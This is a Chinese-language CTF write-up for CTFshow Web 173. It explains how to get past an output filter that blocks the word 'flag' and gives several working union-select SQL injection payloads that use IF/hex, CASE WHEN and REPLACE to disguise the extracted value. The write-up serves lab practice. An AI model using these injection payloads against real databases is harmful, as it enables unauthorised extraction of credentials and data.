与[[ctfshow172sql]]差不多，但是加入了过滤。不过都是最基础的。  

# CTFshow Web 173 SQL 注入绕过滤

题目核心：后端会检查查询结果中是否出现 `flag`，匹配到就不回显“查询成功”。 需要在 **结果进入过滤器之前** 完成“字段改名/编码”。

```
if(!preg_match('/flag/i', json_encode($ret))){
          $ret['msg'] = '查询成功';
          }
```

## 1. 题目理解 Filter Bypass

和前一题类似，但这次对结果集做了关键字匹配。 如果直接把 `username=flag` 原样查出来，结果会被过滤逻辑命中。

- 不要让结果里出现原始字符串 `flag`
- 可以让 `username` 变形后再回显
- 思路仍然是 `union select` 拼接结果集

## 2. 最短路线

最简单办法：不查 `username` 列，直接查其他字段。

```
' union select 1,password,3 from ctfshow_user3 --+
```

但如果要贴近出题意图，建议继续练“带 username 也能绕过滤”。

## 3. 进阶绕过（带 username）核心部分

- IF 条件改写：命中目标用户时输出替代值/编码值。
- CASE WHEN：把 `flag` 映射为其它字符串。
- REPLACE：直接替换结果中的敏感片段。
- HEX/UPPER/LOWER/SUBSTRING/LEFT/RIGHT：统一变形输出(不过这里由于preg_match带有i参数，所以大小写不敏感)。

```
-- IF 方案
            ' union select 1,if(username='flag',hex(username),'no'),password from ctfshow_user3 --+

            -- CASE WHEN 方案
            ' union select case when username='flag' then 'ok' else username end,password,1 from ctfshow_user3 --+

            -- REPLACE 方案
            ' union select replace(username,'flag','ok'),password,1 from ctfshow_user3 --+
```

## 4. 实战提示

- 先确认列数，再对齐 `union select` 字段类型。
- 优先保证 payload 稳定，再做“美化”处理（如别名、编码）。
- 遇到拦截时，先看“输入过滤”还是“输出过滤”。

## 5. 小结

这题本质不是“拿不到数据”，而是“拿到的数据不能含敏感词”。 所以关键是对结果做改写，让语义不变但字符串变形。

```
[cat@neon-shell]$ bypass --target web173 --mode output-morph
            status: pwned ✔
```

Neon Cat Lab · CTFshow SQL Notes